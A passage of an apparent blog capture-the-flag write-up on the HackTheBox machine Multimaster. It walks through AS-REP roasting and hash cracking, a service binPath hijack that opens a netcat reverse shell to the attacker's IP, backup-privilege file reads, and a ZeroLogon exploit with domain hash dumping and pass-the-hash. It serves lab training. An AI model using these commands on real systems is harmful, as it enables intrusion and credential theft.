+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nx">jorden</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertFrom-UACValue</span><span class="w">
+</span><span class="go">
+Name                           Value
+----                           -----
+NORMAL_ACCOUNT                 512
+DONT_EXPIRE_PASSWORD           65536
+DONT_REQ_PREAUTH               4194304
+</span></code></pre></div></div>
+<p>Once I flip that, I can get the hash from my Kali machine:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>GetNPUsers.py <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 10.10.10.179 MEGACORP/jorden
+<span class="go">Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for jorden
+$krb5asrep$23$jorden@MEGACORP:a73d19d63b09964cc6e097172e767f9b$31da65f338ec20aae3fe4c1cede839fdf534fdfa878b6dcd8a0c7acd0453c98b6621d03ab22b38423de129f6de81266ef985eb7d655eb963fcbbc1935dc60bac0dad858b627c469b6a56a30b8e84b682576efbb0896d3ffcee4ae5e41bc621769cb329af2fe3f596828f24349c44c341383352d717f43db48bfde182113102e3b5ed51109ed1b09eb5a97b3afbb0f112abe362ba1de5feef2784743d72759236ce7eac39b3372ac29bd868787ffa9752dea356c93b66522b99ab7019a623e5fdc49fb645792ee5f183697105440966ca027a9060a9a7577ea5bdfc8566e6aea599f9ada7af30997309ca
+</span></code></pre></div></div>
+<p>Or I can use a harmj0y tool, <a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a>. There’s a <code class="language-plaintext highlighter-rouge">.ps1</code> file in the repo. Copy it to SMB to Multimaster, import it, and run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">\\10.10.14.19\share\ASREPRoast.ps1</span><span class="w"> </span><span class="o">.</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\ASREPRoast.ps1</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="nx">Get-ASREPHash</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">megacorp.local</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">jorden</span><span class="w">
+</span><span class="go">$krb5asrep$jorden@MEGACORP.LOCAL:217d8dd459813386d9a7f5f0fa4c3cf1$094bc95da47bee5ef4946e9384e97277961c3069d86a102d4e79b5fed4881db4898d2e1ae38d81fb7327a707a58f771965cad70c3e2f3651e330dd2d85725e343928ae06de4179cee031d580c5c158a55a39bbf4fd3a16f2ec2d1f9377427153e69302d1c6e90cd82f8b4d0ab177c2e370fa051d03480d18dbb52d14c08f79a14cc34257a60e8f2b5af3d8306b26cfc63059f10c5ebf1fde99e9ce6c194132a99769fcacfad6ce01e90764f9df2179ec5f496846f7ae3b5ea307d37aac65cc1e7b91ae4bb1a48bb9adeead8ca5957fb2cb07f1154af572e7ef767cd8e89a834fe5acb0e2218bb4459710ba56e34a5044
+</span></code></pre></div></div>
+<p>The hash format that comes out of the second method requires adding <code class="language-plaintext highlighter-rouge">$23</code> towards the beginning to make it look like the first and work in <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>
+<p>Either way, I’ll set jorden back:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">jorden</span><span class="w"> </span><span class="o">-XOR</span><span class="w"> </span><span class="p">@{</span><span class="nx">useraccountcontrol</span><span class="o">=</span><span class="mi">4194304</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="go">Verbose: [Get-DomainSearcher] search string: LDAP://MULTIMASTER.MEGACORP.LOCAL/DC=MEGACORP,DC=LOCAL
+Verbose: [Get-DomainObject] Get-DomainObject filter string: (&amp;(|(|(samAccountName=jorden)(name=jorden)(displayname=jorden))))
+Verbose: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'jorden'
+</span></code></pre></div></div>
+<p>And verify it no longer works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>GetNPUsers.py <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 10.10.10.179 MEGACORP/jorden
+<span class="go">Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for jorden
+[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+<h3 id="crack-hash">Crack Hash</h3>
+<p>Now <code class="language-plaintext highlighter-rouge">hashcat</code> can crack this pretty quickly:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>hashcat <span class="nt">-m</span> 18200 jorden.hash /usr/share/wordlists/rockyou.txt <span class="nt">--force</span>
+<span class="go">...[snip]...
+$krb5asrep$23$jorden@MEGACORP.LOCAL:c6e1735f291d71135278005a61a8e78e$771ee4486ddcf18fdf2ee216bf2e66cff076ef6907a1154f3458c7e5ef2f65038263f9ce459cfa964ad0057b53676f4c326e5d380910e
+48d9fee2c585819d70cea63442b035359ef6f9cb3a8cfdfffe981c8e7c0aaaf913f9bf8d8df96147b30f15b71e5a9541dcdfcfef20670edfb46b2973917d661fadcc48df2aa9f72c1586a1bbcbff4420f89c4360125f1a9a23
+12466f69201ed5035db7952bb6eaa3cec0edf0888e958e0180333ba11fde7e0448836d87fe3090152980a95c1e6c1a151a83603f1380ea7c306cfbd74fdd19a507c36c1d38db5c7231e9fee7bdbe73ad1dedac61c2b1e9d3ef
+2e36834206c2130:rainforest786
+...[snip]...
+</span></code></pre></div></div>
+<p>The password is rainforest786.</p>
+<h3 id="winrm-2">WinRM</h3>
+<p>The creds work to get a shell as jorden:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>evil-winrm <span class="nt">-u</span> <span class="s2">"MEGACORP</span><span class="se">\j</span><span class="s2">orden"</span> <span class="nt">-p</span> rainforest786 <span class="nt">-i</span> 10.10.10.179
+<span class="go">
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; whoami
+megacorp\jorden    
+</span></code></pre></div></div>
+<h2 id="shell-as-system">Shell as SYSTEM</h2>
+<h3 id="enumeration-3">Enumeration</h3>
+<p>jorden is in the Server Operators group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">jorden</span><span class="w">
+</span><span class="go">User name                    jorden
+Full Name                    Jorden Mclean
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 5:48:17 PM
+Password expires             Never
+Password changeable          1/10/2020 5:48:17 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   4/1/2020 12:15:47 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use*Server Operators
+Global Group memberships     *Domain Users         *Developers
+The command completed successfully.
+</span></code></pre></div></div>
+<p><a href="http://www.thenetworkencyclopedia.com/entry/server-operators-built-in-group/">Reading about it</a>, by default, this group can:</p>
+<blockquote>
+<ul>
+<li>Log on locally to the server console</li>
+<li>Change the system time</li>
+<li>Back up files and directories</li>
+<li>Restore files and directories</li>
+<li>Shut down the system</li>
+<li>Force shutdown from a remote system</li>
+</ul>
+</blockquote>
+<p>From <a href="https://ss64.com/nt/syntax-security_groups.html">ss64.com</a>:</p>
+<blockquote>
+<p>A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p>
+</blockquote>
+<p>The ability to start and stop services is interesting for sure.</p>
+<p>This user has the ability to edit any service. If I run <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a>, I can see this more clearly:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  [+] Looking if you can modify any service registry()
+   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+    HKLM\system\currentcontrolset\services\.NET CLR Data (Server Operators [WriteData/CreateFiles GenericWrite])     
+    HKLM\system\currentcontrolset\services\.NET CLR Networking (Server Operators [WriteData/CreateFiles GenericWrite])                                                   
+    HKLM\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0 (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\.NET Data Provider for Oracle (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\.NET Data Provider for SqlServer (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\.NET Memory Cache 4.0 (Server Operators [WriteData/CreateFiles GenericWrite])                                                
+    HKLM\system\currentcontrolset\services\.NETFramework (Server Operators [WriteData/CreateFiles GenericWrite])     
+    HKLM\system\currentcontrolset\services\1394ohci (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\3ware (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\ACPI (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\AcpiDev (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\acpiex (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\acpipagr (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\AcpiPmi (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\acpitime (Server Operators [WriteData/CreateFiles GenericWrite]) 
+...[snip]...
+</code></pre></div></div>
+<h3 id="exploit-service">Exploit Service</h3>
+<p>To get a shell, I’ll upload <code class="language-plaintext highlighter-rouge">nc64.exe</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">/opt/shells/netcat/nc64.exe</span><span class="w">
+</span><span class="go">Info: Uploading /opt/shells/netcat/nc64.exe to C:\programdata\nc64.exe
+
+                                                             
+Data: 60360 bytes of 60360 bytes copied
+
+Info: Upload successful!
+</span></code></pre></div></div>
+<p>Now I’ll need to find a service I can stop and start. Took a bit of trial and error, but found <code class="language-plaintext highlighter-rouge">browser</code>. I’ll change the <code class="language-plaintext highlighter-rouge">binPath</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\programdata\nc64.exe -e cmd.exe 10.10.14.19 443"</span><span class="w">
+</span><span class="go">[SC] ChangeServiceConfig SUCCESS
+</span></code></pre></div></div>
+<p>Now stop the service, and then start it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">browser</span><span class="w">
+</span><span class="go">
+SERVICE_NAME: browser
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0xafc8
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">browser</span><span class="w">
+</span><span class="go">[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+</span></code></pre></div></div>
+<p>It reports that it failed, but that’s because <code class="language-plaintext highlighter-rouge">nc64.exe</code> isn’t a service binary. At my <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>rlwrap nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.179.
+Ncat: Connection from 10.10.10.179:50019.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+</span></code></pre></div></div>
+<h2 id="unintended-paths">Unintended Paths</h2>
+<h3 id="read-as-system">Read as SYSTEM</h3>
+<h4 id="enumeration-4">Enumeration</h4>
+<p>I had noted earlier that jorden was in the Server Operators group, and that brings a handful of privileges:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\jorden\Documents&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="go">
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======                
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled                
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled                
+SeTimeZonePrivilege           Change the time zone                Enabled 
+</span></code></pre></div></div>
+<p>I’m particularly interesting in backup and restore. I can see that jorden has <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> and <code class="language-plaintext highlighter-rouge">SeRestorePrivilege</code>.</p>
+<h4 id="file-read">File Read</h4>
+<p>With both of these privs, I can use <code class="language-plaintext highlighter-rouge">robocopy</code> to read files (see <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges">PayloadsAllTheThings short reference</a>).</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata\temp&gt;</span><span class="w"> </span><span class="n">robocopy</span><span class="w"> </span><span class="nx">/b</span><span class="w"> </span><span class="nx">C:\users\administrator\desktop</span><span class="w"> </span><span class="nx">C:\programdata\temp</span><span class="w">
+</span><span class="go">
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Wednesday, April 1, 2020 12:48:19 PM
+   Source : C:\users\administrator\desktop\
+     Dest : C:\programdata\temp\
+
+    Files : *.*
+
+  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           2    C:\users\administrator\desktop\
+            New File                 488        desktop.ini
+  0%
+100%
+            New File                  34        root.txt
+  0%
+100%
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         2         2         0         0         0         0
+   Bytes :       522       522         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+   Ended : Wednesday, April 1, 2020 12:48:19 PM
+
+</span><span class="gp">*Evil-WinRM* PS C:\programdata\temp&gt;</span><span class="w"> </span><span class="n">dir</span><span class="w">
+</span><span class="go">
+
+    Directory: C:\programdata\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         4/1/2020   2:36 AM             34 root.txt
+</span></code></pre></div></div>
+<p>Now that it’s there, I can read the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata\temp&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w">
+</span><span class="go">b292dfe5************************
+</span></code></pre></div></div>
+<h3 id="zerologon">ZeroLogon</h3>
+<p>I dropped a <a href="/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html">quick post</a> earlier this week on CVE-2020-1472. I could have run this without doing anything else on the box, and it works here too:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(venv) root@kali#</span><span class="w"> </span>python /opt/CVE-2020-1472/cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
+<span class="go">Performing authentication attempts...
+======================
+Target vulnerable, changing account password to empty string                                    
+
+Result: 0
+
+Exploit complete!
+
+</span><span class="gp">(venv) root@kali#</span><span class="w"> </span>secretsdump.py <span class="nt">-no-pass</span> <span class="nt">-just-dc</span> MULTIMASTER<span class="se">\$</span>@10.10.10.179
+<span class="go">Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                               
+[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::         
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                              
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::
+...[snip]...
+</span></code></pre></div></div>
+<p>I can now use the administrator hash to get <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>evil-winrm <span class="nt">-u</span> administrator <span class="nt">-i</span> 10.10.10.179 <span class="nt">--hash</span> 69cbf4a9b7415c9e1caf93d51d971be0
+<span class="go">
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">megacorp\administrator
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/09/19/htb-multimaster.html"></a>
+</article>
